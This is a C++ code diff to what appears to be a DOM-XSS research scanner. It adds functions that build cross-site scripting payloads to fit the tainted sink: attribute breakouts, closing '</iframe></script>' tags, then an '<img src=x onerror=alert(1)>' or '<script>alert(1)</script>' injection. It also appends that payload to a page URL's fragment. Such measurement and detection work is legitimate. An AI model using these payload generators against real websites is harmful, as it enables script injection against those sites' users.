@@ -342,9 +342,7 @@ std::string Metadata::get_payload() const {
     return this->payload;
 }
 
-std::string Metadata::generate_exploit() const {
-    std::string payload = "";
-    if (is_initialized() && has_valid_exploit()) {
+std::string Metadata::generate_exploit_from_scratch() const {
         // // Try to generate an attribute payload on the fly:
         // // Exploit.success: false
         // // Exploit.status: failure
@@ -354,25 +352,62 @@ std::string Metadata::generate_exploit() const {
         // // Exploit.content: src
         // // Exploit.quote_type: '
         // // Exploit.tag: script
-        // bool payload_done = false;
-        // if (get_exploit_type() == Exploit_Type::Html) {
-        //     if (get_exploit_token() == "attribute") {
-        //         payload += get_exploit_quote_type();
-        //         payload += " ";
-        //         if (get_exploit_tag() == "script") {
-        //             payload += "onload=alert(1)";
-        //             payload_done = true;
-        //         }
-        //         payload += " ";
-        //         payload += get_exploit_quote_type();
-        //     }
-        // }
-        // // Fallback to previously generated payload
-        // if (!payload_done) {
+    std::string payload = "";
+    std::string function = "alert(1)";
+    if (is_initialized() && has_valid_exploit()) {
+        if (get_exploit_type() == Exploit_Type::Html) {
+            if (get_exploit_token() == "attribute") {
+                // Need to break out of attribute
+                payload += get_exploit_quote_type();
+                payload += ">";
+            }
+            // Now break out of non-executing contexts
+            //payload += "</iframe></style></script></object></embed></textarea>";
+            payload += "</iframe></script>";
+            // Add execution tags
+            if ((get_sink() == "innerHTML") ||
+                (get_sink() == "outerHTML") ||
+                (get_sink() == "insertAdjacentHTML")) {
+                payload += "<img src=x onerror=";
+            } else {
+                payload += "<script>";
+            }
+            payload += function;
+            if ((get_sink() == "innerHTML") ||
+                (get_sink() == "outerHTML") ||
+                (get_sink() == "insertAdjacentHTML")) {
+                payload += "><!--/*";
+            } else {
+                payload += "</script><!--/*";
+            }
+        }
+    }
+    return payload;
+}
+
+std::string Metadata::generate_exploit_url(const std::string& payload) const
+{
+    std::string url = get_url();
+    std::string exploit = url;
+
+    if (payload == "") {
+        return "";
+    }
+
+    if (!std::regex_match(url, std::regex("#"))) {
+        exploit += "#";
+    }
+    exploit += payload;
+    return exploit;
+}
+
+std::string Metadata::get_generated_exploit() const {
+    std::string payload = "";
+    if (is_initialized() && has_valid_exploit()) {
         payload = get_payload();
         // Remove the closing tags if they are there...
-        payload = std::regex_replace(payload, std::regex("</iframe></style></script></object></embed></textarea>"), "");
-        payload = std::regex_replace(payload, std::regex("<!--/\\*"), "");
+        // payload = std::regex_replace(payload, std::regex("</iframe></style></script></object></embed></textarea>"), "");
+        // payload = std::regex_replace(payload, std::regex("<!--/\\*"), "");
         payload = std::regex_replace(payload, std::regex("taintfoxLog"), "alert");
     }
     return payload;
@@ -380,6 +415,7 @@ std::string Metadata::generate_exploit() const {
 
 void Metadata::print(std::ostream& os) const {
     os << get_uuid() << ", ";
+    os << get_sanitizer_score() << ",";
     os << get_domain() << ", ";
     os << get_source() << ", ";
     os << get_sink() << ", ";
@@ -393,4 +429,23 @@ void Metadata::print(std::ostream& os) const {
     os << get_exploit_quote_type() << ", ";
     os << is_exploit_successful() << ", ";
     os << get_url() << ", ";
+}
+
+void Metadata::printHeader(std::ostream& os)
+{
+    os << "uuid , ";
+    os << "sanitizer_score,";
+    os << "domain, ";
+    os << "source, ";
+    os << "sink, ";
+    os << "hash, ";
+    os << "sanitizer_hash, ";
+    os << "twenty_five_million_flows_id, ";
+    os << "script, ";
+    os << "line, ";
+    os << "exploit_tag, ";
+    os << "exploit_token, ";
+    os << "exploit_quote_type, ";
+    os << "exploit_successful, ";
+    os << "url, ";
 }
